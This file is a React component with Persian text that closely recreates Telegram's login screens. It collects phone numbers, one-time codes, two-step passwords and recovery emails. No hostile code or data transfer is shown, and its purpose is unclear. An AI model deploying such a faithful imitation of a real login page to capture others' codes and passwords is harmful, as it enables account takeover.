'use client';

import { useEffect, useState, type ReactNode } from 'react';

import { closeHistoryOverlay, useHistoryOverlay } from '@/components/overlay/useHistoryOverlay';
import { toPersianDigits } from '@/lib/numbers';
import {
  COPY,
  type LoginAlert,
  type LoginPage,
} from '@/lib/telegramLoginCopy';

import { GoogleMark, LoginHero } from './LoginHero';

export const KEYBOARD_PAGES: LoginPage[] = [
  'phone',
  'sms',
  'app',
  'call',
  'missed',
  'fragment',
  'recover',
  'emailSetup',
  'emailCode',
];

export const FAB_PAGES: LoginPage[] = [
  'phone',
  'password',
  'newPass1',
  'newPass2',
  'email',
  'word',
  'phrase',
];

export type LoginForm = {
  first: string;
  last: string;
  password: string;
  password2: string;
  hint: string;
  email: string;
  word: string;
};

export const EMPTY_FORM: LoginForm = {
  first: '',
  last: '',
  password: '',
  password2: '',
  hint: '',
  email: '',
  word: '',
};

export function previousPage(page: LoginPage): LoginPage {
  switch (page) {
    case 'sms':
    case 'app':
    case 'call':
    case 'flash':
    case 'missed':
    case 'fragment':
    case 'word':
    case 'phrase':
    case 'pay':
    case 'success':
    case 'password':
    case 'email':
      return 'phone';
    case 'recover':
    case 'resetWait':
      return 'password';
    case 'newPass1':
      return 'recover';
    case 'newPass2':
      return 'newPass1';
    case 'emailSetup':
    case 'emailCode':
      return 'email';
    default:
      return 'phone';
  }
}

/** Code / email steps: Telegram shows the EditNumber dialog on back. */
export const EDIT_NUMBER_BACK_PAGES: LoginPage[] = [
  'sms',
  'app',
  'call',
  'flash',
  'missed',
  'fragment',
  'word',
  'phrase',
  'pay',
  'email',
  'emailCode',
];

export function confirmBackAlert(page: LoginPage): LoginAlert | null {
  if (page === 'password') {
    return 'stopVerification';
  }
  if (EDIT_NUMBER_BACK_PAGES.includes(page)) {
    return 'editNumber';
  }
  return null;
}

export function otpLengthFor(page: LoginPage): number {
  if (page === 'missed') {
    return 4;
  }
  if (page === 'recover' || page === 'emailCode' || page === 'emailSetup') {
    return 6;
  }
  if (page === 'sms' || page === 'app' || page === 'call' || page === 'fragment') {
    return 5;
  }
  return 0;
}

export function defaultNextType(page: LoginPage): LoginPage | null {
  switch (page) {
    case 'sms':
      return 'call';
    case 'app':
      return 'sms';
    case 'call':
    case 'flash':
    case 'missed':
      return 'sms';
    case 'fragment':
      return 'sms';
    default:
      return null;
  }
}

function Title({ children }: { children: string }) {
  return <h1 className="tg-title">{children}</h1>;
}

function Sub({ children }: { children: ReactNode }) {
  return <p className="tg-subtitle">{children}</p>;
}

function PhoneSub({ text, phone }: { text: string; phone: string }) {
  const index = text.indexOf(phone);
  if (index < 0) {
    return <Sub>{text}</Sub>;
  }

  return (
    <p className="tg-subtitle">
      {text.slice(0, index)}
      <bdi className="tg-phone-bdi" dir="ltr">
        {phone}
      </bdi>
      {text.slice(index + phone.length)}
    </p>
  );
}


export function CodeBoxes({
  length,
  value,
  error,
}: {
  length: number;
  value: string;
  error?: boolean;
}) {
  const cells = Array.from({ length }, (_, index) => value[index] ?? '');
  const active = Math.min(value.length, length - 1);

  return (
    <div className={`tg-code-boxes${error ? ' is-error' : ''}`} dir="ltr">
      {cells.map((digit, index) => (
        <span
          key={index}
          className={`tg-code-box${index === active ? ' is-on' : ''}${digit ? ' has-val' : ''}`}
        >
          {digit}
        </span>
      ))}
    </div>
  );
}

function OutlineInput({
  label,
  value,
  onChange,
  type = 'text',
  active,
  onFocus,
  error,
  placeholder,
  dir = 'rtl',
}: {
  label: string;
  value: string;
  onChange: (value: string) => void;
  type?: string;
  active?: boolean;
  onFocus?: () => void;
  error?: boolean;
  placeholder?: string;
  dir?: 'ltr' | 'rtl';
}) {
  return (
    <label
      className={`tg-outline tg-outline-input${active || value ? ' is-filled' : ''}${
        active ? ' is-active' : ''
      }${error ? ' is-shake' : ''}`}
    >
      <span className="tg-outline-label">{label}</span>
      <input
        className="tg-text-input"
        dir={dir}
        type={type}
        value={value}
        placeholder={placeholder}
        autoComplete={type === 'password' ? 'current-password' : type === 'email' ? 'email' : 'off'}
        autoCapitalize="off"
        autoCorrect="off"
        spellCheck={dir === 'ltr' ? false : undefined}
        onChange={(event) => onChange(event.target.value)}
        onFocus={onFocus}
      />
    </label>
  );
}

function formatClockFa(seconds: number) {
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return `${toPersianDigits(m)}:${toPersianDigits(String(s).padStart(2, '0'))}`;
}

export function LoginInnerPage({
  page,
  phone,
  otp,
  otpError,
  form,
  nextType,
  missedPrefix,
  fieldError,
  timeout,
  codeLength,
  fragmentUrl,
  wordBeginning,
  emailPattern,
  googleSigninAllowed,
  resetWaitUntil,
  onForm,
  onLink,
}: {
  page: LoginPage;
  phone: string;
  otp: string;
  otpError: boolean;
  form: LoginForm;
  nextType: LoginPage | null;
  missedPrefix: string;
  fieldError: boolean;
  timeout: number;
  codeLength: number;
  fragmentUrl?: string;
  wordBeginning?: string;
  emailPattern?: string;
  googleSigninAllowed?: boolean;
  resetWaitUntil?: string | null;
  onForm: (patch: Partial<LoginForm>) => void;
  onLink: (action: string) => void;
}) {
  const initialTimeout = timeout > 0 ? timeout : 0;
  const [seconds, setSeconds] = useState(initialTimeout);
  const [waitLeft, setWaitLeft] = useState(() =>
    resetWaitUntil ? Math.max(0, Math.floor((Date.parse(resetWaitUntil) - Date.now()) / 1000)) : 0,
  );
  const [focus, setFocus] = useState('a');
  const otpBoxes = codeLength > 0 ? codeLength : otpLengthFor(page);

  useEffect(() => {
    if (!KEYBOARD_PAGES.includes(page) && page !== 'flash' && page !== 'call') {
      return;
    }
    setSeconds(timeout > 0 ? timeout : 0);
    if (timeout <= 0) {
      return;
    }
    const timer = window.setInterval(() => {
      setSeconds((value) => (value > 0 ? value - 1 : 0));
    }, 1000);
    return () => window.clearInterval(timer);
  }, [page, timeout]);

  useEffect(() => {
    if (page !== 'resetWait') {
      return;
    }
    const remaining = resetWaitUntil
      ? Math.max(0, Math.floor((Date.parse(resetWaitUntil) - Date.now()) / 1000))
      : 0;
    setWaitLeft(remaining);
    if (remaining <= 0) {
      return;
    }
    const timer = window.setInterval(() => {
      setWaitLeft((value) => Math.max(0, value - 1));
    }, 1000);
    return () => window.clearInterval(timer);
  }, [page, resetWaitUntil]);

  const waitLabel = () => {
    const d = Math.floor(waitLeft / 86400);
    const h = Math.floor((waitLeft % 86400) / 3600);
    const m = Math.floor((waitLeft % 3600) / 60);
    const s = waitLeft % 60;
    return `${d} روز ${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
  };

  const didNotGetLabel = () => {
    if (page === 'app' && (nextType === 'call' || nextType === 'flash' || nextType === 'missed')) {
      return COPY.didNotGetCodePhone;
    }
    if (page === 'app' && nextType === 'fragment') {
      return COPY.didNotGetCodeFragment;
    }
    if (page === 'app' && nextType === 'sms') {
      return COPY.didNotGetCodeSms;
    }
    return COPY.didNotGetCode;
  };

  const timerLine = () => {
    const clock = formatClockFa(seconds);
    if (nextType === 'call' || nextType === 'missed' || nextType === 'flash') {
      return COPY.callText(clock);
    }
    return COPY.smsTimer(clock);
  };

  if (page === 'sms' || page === 'app' || page === 'call' || page === 'fragment') {
    const title =
      page === 'app'
        ? COPY.sentAppTitle
        : page === 'call'
          ? COPY.yourCode
          : COPY.sentSmsTitle;
    const subText =
      page === 'app'
        ? COPY.sentApp(phone)
        : page === 'call'
          ? COPY.sentCall(phone)
          : page === 'fragment'
            ? COPY.sentFragment(phone)
            : COPY.sentSms(phone);
    const footer =
      page === 'fragment' ? (
        <button
          type="button"
          className="tg-pay-cta tg-fragment-cta"
          onClick={() => onLink(fragmentUrl ? 'fragment' : 'did-not-get')}
        >
          <LoginHero kind="fragment" />
          {COPY.openFragment}
        </button>
      ) : page === 'app' ? (
        <button type="button" className="tg-text-link" onClick={() => onLink('to-sms')}>
          {COPY.sendCodeSms}
        </button>
      ) : page === 'sms' ? (
        seconds > 0 ? (
          <p className="tg-timer">
            {COPY.voiceCallTimerBefore}{' '}
            <bdi className="tg-phone-bdi" dir="ltr">
              {formatClockFa(seconds)}
            </bdi>{' '}
            {COPY.voiceCallTimerAfter}
          </p>
        ) : (
          <button type="button" className="tg-text-link" onClick={() => onLink('resend')}>
            {COPY.requestVoiceCall}
          </button>
        )
      ) : seconds > 0 && nextType ? (
        <p className="tg-timer">{timerLine()}</p>
      ) : (
        <button type="button" className="tg-text-link" onClick={() => onLink('resend')}>
          {didNotGetLabel()}
        </button>
      );

    return (
      <div className="tg-inner">
        <LoginHero kind={page === 'app' ? 'laptop' : page === 'fragment' ? 'sms' : page === 'call' ? 'call' : 'sms'} />
        <Title>{title}</Title>
        <PhoneSub text={subText} phone={phone} />
        <CodeBoxes length={otpBoxes || 5} value={otp} error={otpError} />
        {otpError ? <p className="tg-wrong-inline">{COPY.wrongCode}</p> : null}
        {footer}
      </div>
    );
  }

  if (page === 'flash') {
    return (
      <div className="tg-inner tg-inner-center">
        <LoginHero kind="flash" />
        <Title>{COPY.yourCode}</Title>
        <Sub>{COPY.flashCall}</Sub>
        {seconds > 0 ? (
          <p className="tg-timer">{timerLine()}</p>
        ) : (
          <button type="button" className="tg-text-link" onClick={() => onLink('to-sms')}>
            {COPY.didNotGetCode}
          </button>
        )}
      </div>
    );
  }

  if (page === 'missed') {
    return (
      <div className="tg-inner">
        <LoginHero kind="missed" />
        <Title>{COPY.missedTitle}</Title>
        <Sub>{COPY.missedSub}</Sub>
        <div className="tg-missed-row" dir="ltr">
          <span className="tg-missed-prefix">{missedPrefix}</span>
          <CodeBoxes length={otpBoxes || 4} value={otp} error={otpError} />
        </div>
        <Sub>{COPY.missedSub2}</Sub>
        {otpError ? <p className="tg-wrong-inline">{COPY.wrongCode}</p> : null}
        {seconds > 0 && nextType ? (
          <p className="tg-timer">{timerLine()}</p>
        ) : (
          <button type="button" className="tg-text-link" onClick={() => onLink('resend')}>
            {COPY.sendCodeSms}
          </button>
        )}
      </div>
    );
  }

  if (page === 'word' || page === 'phrase') {
    return (
      <div className="tg-inner">
        <LoginHero kind="bubble" />
        <Title>{page === 'word' ? COPY.wordTitle : COPY.phraseTitle}</Title>
        <Sub>
          {wordBeginning
            ? page === 'word'
              ? COPY.wordBeginning(wordBeginning)
              : COPY.phraseBeginning(wordBeginning)
            : page === 'word'
              ? COPY.wordInfo
              : COPY.phraseInfo}
        </Sub>
        <div className="tg-stack">
          <OutlineInput
            label={page === 'word' ? COPY.smsWord : COPY.smsPhrase}
            value={form.word}
            onChange={(value) => onForm({ word: value })}
            dir="ltr"
            active={focus === 'a'}
            error={fieldError}
            onFocus={() => setFocus('a')}
          />
        </div>
        <button type="button" className="tg-text-link" onClick={() => onLink('paste')}>
          {COPY.paste}
        </button>
        {nextType ? (
          <button type="button" className="tg-text-link" onClick={() => onLink('resend')}>
            {COPY.didNotGetCode}
          </button>
        ) : null}
      </div>
    );
  }

  if (page === 'password') {
    return (
      <div className="tg-inner tg-inner-password">
        <LoginHero kind="lock" />
        <Title>{COPY.passwordHeader}</Title>
        <Sub>{COPY.passwordText}</Sub>
        <div className="tg-stack">
          <OutlineInput
            label={COPY.enterPassword}
            value={form.password}
            onChange={(value) => onForm({ password: value })}
            type="password"
            dir="ltr"
            placeholder={form.hint}
            active={focus === 'a'}
            error={fieldError}
            onFocus={() => setFocus('a')}
          />
        </div>
        <button type="button" className="tg-forgot" onClick={() => onLink('forgot')}>
          {COPY.forgotPassword}
        </button>
      </div>
    );
  }

  if (page === 'recover') {
    return (
      <div className="tg-inner">
        <LoginHero kind="mail" />
        <Title>{COPY.enterCode}</Title>
        <Sub>
          {emailPattern ? COPY.restoreEmailSent(emailPattern) : COPY.restoreEmailInfo}
        </Sub>
        <CodeBoxes length={otpBoxes || 6} value={otp} error={otpError} />
        {otpError ? <p className="tg-wrong-inline">{COPY.wrongCode}</p> : null}
        <button type="button" className="tg-forgot" onClick={() => onLink('no-email')}>
          {COPY.cantAccessEmail}
        </button>
      </div>
    );
  }

  if (page === 'resetWait') {
    const ready = waitLeft === 0;
    return (
      <div className="tg-inner">
        <LoginHero kind="wait" />
        <Title>{COPY.resetAccount}</Title>
        <Sub>{COPY.resetStatus}</Sub>
        <p className="tg-wait-time">{waitLabel()}</p>
        <button
          type="button"
          className={`tg-reset-btn${ready ? ' is-on' : ''}`}
          disabled={!ready}
          onClick={() => onLink('reset')}
        >
          {COPY.resetAccount}
        </button>
      </div>
    );
  }

  if (page === 'newPass1') {
    return (
      <div className="tg-inner">
        <Title>{COPY.setNewPassword}</Title>
        <Sub>{COPY.newPassHint1}</Sub>
        <div className="tg-stack">
          <OutlineInput
            label={COPY.firstPassword}
            value={form.password}
            onChange={(value) => onForm({ password: value })}
            type="password"
            dir="ltr"
            active={focus === 'a'}
            error={fieldError}
            onFocus={() => setFocus('a')}
          />
          <OutlineInput
            label={COPY.secondPassword}
            value={form.password2}
            onChange={(value) => onForm({ password2: value })}
            type="password"
            dir="ltr"
            active={focus === 'b'}
            onFocus={() => setFocus('b')}
          />
        </div>
      </div>
    );
  }

  if (page === 'newPass2') {
    return (
      <div className="tg-inner">
        <Title>{COPY.setNewPassword}</Title>
        <Sub>{COPY.newPassHint2}</Sub>
        <div className="tg-stack">
          <OutlineInput
            label={COPY.passwordHint}
            value={form.hint}
            onChange={(value) => onForm({ hint: value })}
            active
            onFocus={() => setFocus('a')}
          />
        </div>
      </div>
    );
  }

  if (page === 'email') {
    return (
      <div className="tg-inner tg-inner-email">
        <LoginHero kind="mail" />
        <Title>{COPY.addEmailTitle}</Title>
        <Sub>{COPY.addEmailSub}</Sub>
        <div className="tg-email-field">
          <OutlineInput
            label={COPY.yourEmail}
            value={form.email}
            onChange={(value) => onForm({ email: value })}
            type="email"
            dir="ltr"
            active={focus === 'a'}
            error={fieldError}
            onFocus={() => setFocus('a')}
          />
        </div>
        {googleSigninAllowed ? (
          <div className="tg-email-google">
            <div className="tg-or">
              <span>{COPY.loginOr}</span>
            </div>
            <button type="button" className="tg-google" onClick={() => onLink('google')}>
              <GoogleMark />
              {COPY.googleSignIn}
            </button>
          </div>
        ) : null}
      </div>
    );
  }

  if (page === 'emailCode' || page === 'emailSetup') {
    return (
      <div className="tg-inner">
        <LoginHero kind={page === 'emailSetup' ? 'heart' : 'inbox'} />
        <Title>{page === 'emailSetup' ? COPY.verificationCode : COPY.checkEmail}</Title>
        <Sub>{COPY.checkYourEmail(form.email || emailPattern || '…')}</Sub>
        <CodeBoxes length={otpBoxes || 6} value={otp} error={otpError} />
        {otpError ? <p className="tg-wrong-inline">{COPY.wrongCode}</p> : null}
        <button type="button" className="tg-text-link" onClick={() => onLink('resend')}>
          {COPY.resendCode}
        </button>
        {page === 'emailCode' ? (
          <button type="button" className="tg-forgot" onClick={() => onLink('reset-email')}>
            {COPY.cantAccessEmail}
          </button>
        ) : null}
      </div>
    );
  }

  if (page === 'pay') {
    return (
      <div className="tg-inner tg-pay">
        <LoginHero kind="star" />
        <Title>{COPY.smsFeeTitle}</Title>
        <ul className="tg-pay-list">
          <li>
            <strong>{COPY.smsFee1Title}</strong>
            <span>{COPY.smsFee1Text}</span>
          </li>
          <li>
            <strong>{COPY.smsFee2Title}</strong>
            <span>{COPY.smsFee2Text}</span>
          </li>
          <li>
            <strong>{COPY.smsFee3Title}</strong>
            <span>{COPY.smsFee3Text}</span>
          </li>
        </ul>
        <button type="button" className="tg-pay-cta" onClick={() => onLink('pay')}>
          {COPY.smsFeeCta}
        </button>
      </div>
    );
  }

  if (page === 'success') {
    return (
      <div className="tg-inner tg-inner-center">
        <LoginHero kind="ok" />
        <Title>{COPY.loginOk}</Title>
        <button type="button" className="tg-text-link" onClick={() => onLink('home')}>
          {COPY.continue}
        </button>
      </div>
    );
  }

  return null;
}

function floodLabel(seconds: number) {
  if (seconds >= 3600) {
    return COPY.hours(Math.ceil(seconds / 3600));
  }
  if (seconds >= 60) {
    return COPY.minutes(Math.ceil(seconds / 60));
  }
  return COPY.seconds(Math.max(1, seconds));
}

function alertBody(
  alert: LoginAlert,
  phone: string,
  country: string,
  extras: { floodWaitSeconds?: number; recoveryEmailPattern?: string; errorDetail?: string },
) {
  switch (alert) {
    case 'chooseCountry':
      return { title: COPY.problem, message: COPY.chooseCountry, extra: COPY.ok };
    case 'wrongCountry':
      return { title: COPY.problem, message: COPY.wrongCountry, extra: COPY.ok };
    case 'invalidPhone':
      return { title: COPY.problem, message: COPY.invalidPhone, extra: COPY.botHelp };
    case 'bannedPhone':
      return { title: COPY.problem, message: COPY.bannedPhone, extra: COPY.botHelp };
    case 'shortNumber':
      return {
        title: COPY.wrongNumberFormat,
        message: COPY.shortNumber(country, phone),
        extra: COPY.ok,
      };
    case 'wrongCode':
      return { title: COPY.wrongCodeTitle, message: COPY.wrongCode, extra: COPY.ok };
    case 'floodWait':
      return {
        title: COPY.wrongCodeTitle,
        message: COPY.floodWait(floodLabel(extras.floodWaitSeconds || 60)),
        extra: COPY.ok,
      };
    case 'codeExpired':
      return { title: COPY.problem, message: COPY.codeExpired, extra: COPY.ok };
    case 'phoneFlood':
      return { title: COPY.problem, message: COPY.phoneFlood, extra: COPY.ok };
    case 'noEmail':
      return { title: COPY.noEmailTitle, message: COPY.noEmailText, extra: COPY.resetAccount };
    case 'noMail':
      return { title: COPY.problem, message: COPY.noMailInstalled, extra: COPY.ok };
    case 'restoreEmail':
      return {
        title: COPY.restoreEmailTitle,
        message: COPY.restoreEmailSent(extras.recoveryEmailPattern || 'ایمیلتان'),
        extra: COPY.continue,
      };
    case 'tos':
      return { title: COPY.tosTitle, message: COPY.tos, extra: COPY.accept };
    case 'tosDecline':
      return { title: COPY.tosTitle, message: COPY.tosDecline, extra: COPY.signUp };
    case 'alreadyLoggedIn':
      return { title: COPY.problem, message: COPY.alreadyLoggedIn, extra: COPY.accountSwitch };
    case 'stopLoading':
      return { title: COPY.stopLoadingTitle, message: COPY.stopLoading, extra: COPY.waitMore };
    case 'didNotGetCode':
      return { title: COPY.problem, message: COPY.didNotGetInfo(phone), extra: COPY.help };
    case 'resetWarning':
      return { title: COPY.resetWarning, message: COPY.resetWarningText, extra: COPY.resetNow };
    case 'resetCancelled':
      return { title: COPY.problem, message: COPY.resetCancelled, extra: COPY.ok };
    case 'wrongPassword':
      return { title: COPY.problem, message: COPY.wrongPassword, extra: COPY.ok };
    case 'passwordsMismatch':
      return { title: COPY.problem, message: COPY.passwordsMismatch, extra: COPY.ok };
    case 'permissionCall':
      return { title: COPY.problem, message: COPY.permissionCall, extra: COPY.continue };
    case 'permissionCallLog':
      return { title: COPY.problem, message: COPY.permissionCallLog, extra: COPY.continue };
    case 'updateApp':
      return { title: COPY.problem, message: COPY.updateApp, extra: COPY.ok };
    case 'signUpRequired':
      return { title: COPY.problem, message: COPY.signUpRequired, extra: COPY.ok };
    case 'wrongAccount':
      return { title: COPY.problem, message: COPY.wrongAccount, extra: COPY.ok };
    case 'recaptcha':
      return { title: COPY.problem, message: COPY.recaptcha, extra: COPY.ok };
    case 'googleUnavailable':
      return { title: COPY.problem, message: COPY.googleUnavailable, extra: COPY.ok };
    case 'emailInvalid':
      return { title: COPY.problem, message: extras.errorDetail || COPY.emailInvalid, extra: COPY.ok };
    case 'serverError':
      return { title: COPY.problem, message: extras.errorDetail || COPY.serverError, extra: COPY.ok };
    case 'editNumber':
      return { title: COPY.editNumber, message: COPY.editNumberInfo(phone), extra: COPY.close };
    case 'stopVerification':
      return { title: '', message: COPY.stopVerification, extra: COPY.continue };
    default:
      return { title: COPY.problem, message: '', extra: COPY.ok };
  }
}

export function LoginAlertDialog({
  alert,
  phone,
  country,
  floodWaitSeconds,
  recoveryEmailPattern,
  errorDetail,
  onClose,
  onAction,
}: {
  alert: LoginAlert;
  phone: string;
  country: string;
  floodWaitSeconds?: number;
  recoveryEmailPattern?: string;
  errorDetail?: string;
  onClose: () => void;
  onAction: (action: string) => void;
}) {
  useHistoryOverlay(onClose);

  const body = alertBody(alert, phone, country, { floodWaitSeconds, recoveryEmailPattern, errorDetail });
  const secondary =
    alert === 'tos'
      ? COPY.decline
      : alert === 'tosDecline'
        ? COPY.decline
        : alert === 'noEmail' || alert === 'resetWarning'
          ? COPY.cancel
          : alert === 'stopLoading'
            ? COPY.stop
            : alert === 'stopVerification'
              ? COPY.stop
              : alert === 'editNumber'
                ? COPY.edit
                : alert === 'invalidPhone' || alert === 'bannedPhone'
                  ? COPY.ok
                  : alert === 'alreadyLoggedIn'
                    ? COPY.ok
                    : alert === 'didNotGetCode'
                      ? COPY.ok
                      : null;

  const extraSecondary = alert === 'didNotGetCode' ? COPY.editNumber : null;

  return (
    <>
      <div className="tg-overlay" onClick={closeHistoryOverlay} />
      <div className="tg-alert">
        {body.title ? <div className="tg-alert-title">{body.title}</div> : null}
        <div className="tg-alert-msg">{body.message}</div>
        <div className="tg-alert-actions">
          {extraSecondary ? (
            <button type="button" className="tg-dialog-btn" onClick={() => onAction('edit')}>
              {extraSecondary}
            </button>
          ) : null}
          {secondary ? (
            <button
              type="button"
              className="tg-dialog-btn"
              onClick={() =>
                onAction(
                  alert === 'editNumber' || alert === 'stopVerification'
                    ? 'edit'
                    : alert === 'didNotGetCode'
                      ? 'ok'
                      : 'secondary',
                )
              }
            >
              {secondary}
            </button>
          ) : null}
          <button type="button" className="tg-dialog-btn" onClick={() => onAction('primary')}>
            {body.extra}
          </button>
        </div>
      </div>
    </>
  );
}
